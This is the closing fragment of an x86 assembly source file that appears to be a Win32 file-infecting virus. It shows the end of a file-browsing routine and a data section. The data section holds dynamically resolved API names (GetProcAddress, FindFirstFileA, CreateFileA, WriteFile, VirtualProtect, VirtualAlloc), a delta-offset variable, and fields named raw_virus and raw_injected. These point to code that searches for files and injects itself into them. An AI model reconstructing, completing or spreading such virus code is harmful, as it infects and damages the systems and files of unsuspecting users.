ja		find_next_file

done_find:

ret

browse_files endp
;----------------------------------------------------------------------

;------------------------------------------------------------------------

ovl_g			dd 20 dup(0)
delta			dd 0
beg				dd 0
kernel32		dd 0
old				dd 0
gpa				dd 0
fff				dd 0
fnf				dd 0
path			db 262 dup(0)
gcd				dd 0
gmfn			dd 0
h_file			dd 0
msz				dd 0
cf				dd 0
rf				dd 0
wf				dd 0
mg				dd 0
strlen			dd 0
strcpy			dd 0
tmp				dd 0
clh				dd 0
user32			dd 0
load			dd 0
virAlloc		dd 0
virFree			dd 0
exitprocess		dd 0

tit				db "Hello world" , 0
getprocaddress 	db "GetProcAddress", 0
findfirstfile	db "FindFirstFileA", 0
findnextfile 	db "FindNextFileA", 0
writefile  		db "WriteFile", 0
readfile		db "ReadFile", 0
messagebox		db "MessageBoxA", 0
loadlib			db "LoadLibraryA", 0
lib_user32		db "user32.dll", 0
virtualprotect	db "VirtualProtect", 0
viralloc		db "VirtualAlloc", 0
virfree			db "VirtualFree", 0
getpath			db "GetCurrentDirectoryA", 0
createfile 		db "CreateFileA", 0
getpathfile		db "GetModuleFileNameA", 0

memsetzero		db "RtlZeroMemory", 0
len				db "lstrlenA", 0
cpy				db "lstrcpyA", 0

exit			db "ExitProcess", 0

clshandle		db "CloseHandle", 0		 

file_name		db 262 dup(0)
tmp_1			dd 0
tmp_2			dd 0
tmp_3			dd 0
tmp_9			dd 0

raw_size		dd 0
raw_virus		dd 0
raw_injected 	dd 0
;_win32_find_data
dwFileAttributes    dd 0
time				dd 6 dup(0)
nFileSizeHigh       dd 0
nFileSizeLow        dd 0
dwReserved0         dd 0
dwReserved1         dd 0
cFileName           db 260 dup(?)
cAlternateFileName  db 14 dup(?)

end start
